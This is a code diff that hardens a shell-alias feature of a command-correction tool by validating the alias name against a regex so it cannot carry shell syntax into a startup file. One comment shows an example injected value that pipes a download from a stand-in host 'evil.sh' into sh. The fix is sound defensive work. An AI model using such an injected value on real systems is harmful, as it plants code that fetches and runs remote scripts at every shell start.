@@ -1,10 +1,35 @@
+import re
+import sys
 from ..conf import settings
-from ..logs import warn
+from ..logs import failed, warn
 from ..shells import shell
+
+# What may be used as the name of the alias.
+#
+# The name is pasted into shell code that the user is then told to put in a
+# startup file, so `thebleep --alias-loader 'x; curl evil.sh|sh; f'` writes a
+# line that runs that at every shell startup. A name is a word: a letter or an
+# underscore, then letters, digits, underscores or hyphens. That covers every
+# name anyone actually wants -- `bleep`, `fuck`, `oops`, `fix-it` -- and no
+# shell syntax at all.
+NAME = re.compile(r'^[^\W\d][\w-]*$', re.UNICODE)
+
+
+def _checked(name):
+    """`name`, or nothing at all and a message saying why."""
+    if NAME.match(name):
+        return name
+
+    failed(u'{!r} cannot be the name of the alias: a name is a letter or an '
+           u'underscore followed by letters, digits, underscores or hyphens. '
+           u'Anything else would be shell code in your startup file.'
+           .format(name))
+    sys.exit(1)
 
 
 def _get_alias(known_args):
-    alias = shell.app_alias(known_args.alias)
+    name = _checked(known_args.alias)
+    alias = shell.app_alias(name)
 
     if known_args.enable_experimental_instant_mode:
         from ..utils import which
@@ -12,7 +37,7 @@ def _get_alias(known_args):
         if not which('script'):
             warn("Instant mode requires `script` app")
         else:
-            return shell.instant_mode_alias(known_args.alias)
+            return shell.instant_mode_alias(name)
 
     return alias
 
@@ -32,4 +57,4 @@ def print_alias_loader(known_args):
 
     """
     settings.init(known_args)
-    print(shell.app_alias_loader(known_args.alias_loader))
+    print(shell.app_alias_loader(_checked(known_args.alias_loader)))
